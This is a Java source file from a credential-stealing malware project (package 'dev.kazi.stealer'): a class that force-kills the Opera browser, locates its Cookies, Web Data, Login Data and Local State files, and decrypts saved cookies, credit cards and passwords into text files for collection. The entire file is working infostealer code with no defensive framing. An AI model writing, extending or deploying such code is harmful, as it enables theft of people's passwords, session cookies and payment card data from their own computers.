package dev.kazi.stealer.node.nodes.impl.browser;

import dev.kazi.stealer.utils.decrypt.password.PasswordDecrypt;
import dev.kazi.stealer.utils.decrypt.creditcards.CreditCardsDecrypt;
import dev.kazi.stealer.utils.decrypt.cookie.CookieDecrypt;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.File;
import java.io.IOException;
import dev.kazi.stealer.node.Category;
import dev.kazi.stealer.node.Node;

public class Opera extends Node {

    public Opera() throws IOException {
        super(Category.FILE);
        Runtime.getRuntime().exec("taskkill /f /im opera.exe");
    }
    
    @Override
    public void createNode() {
        try {
            if (new File("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Network\\Cookies").exists()) {
                this.cookie();
            }
            if (new File("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Web Data").exists()) {
                this.creditCards();
            }
            if (new File("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data").exists()) {
                this.password();
            }
        }
        catch (final IOException e) {
            e.printStackTrace();
        }
    }
    
    public void cookie() throws IOException {
        if (new File("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Network\\Cookies").exists()) {
            final FileWriter writer = new FileWriter(this.mergePath(this.getFolder(), "Cookies") + "\\Opera.txt", true);
            final BufferedWriter bufferedWriter = new BufferedWriter(writer);
            bufferedWriter.write(new CookieDecrypt("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Network\\Cookies", "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local State").getCookies().getData());
            bufferedWriter.close();
        }
    }
    
    public void creditCards() throws IOException {
        if (!new CreditCardsDecrypt("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Web Data", "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local State").getCards().getData().isEmpty()) {
            final FileWriter writer = new FileWriter(this.mergePath(this.getFolder(), "General\\CreditCards.txt"), true);
            final BufferedWriter bufferedWriter = new BufferedWriter(writer);
            bufferedWriter.write(new CreditCardsDecrypt("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Web Data", "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local State").getCards().getData());
            bufferedWriter.close();
        }
    }
    
    public void password() throws IOException {
        if (!new PasswordDecrypt("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data", "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local State").getPasswords().getData().isEmpty()) {
            final FileWriter writer = new FileWriter(this.mergePath(this.getFolder(), "General\\PasswordsOPERA.txt"), true);
            final BufferedWriter bufferedWriter = new BufferedWriter(writer);
            bufferedWriter.write(new PasswordDecrypt("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data", "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local State").getPasswords().getData());
            bufferedWriter.close();
        }
    }
}
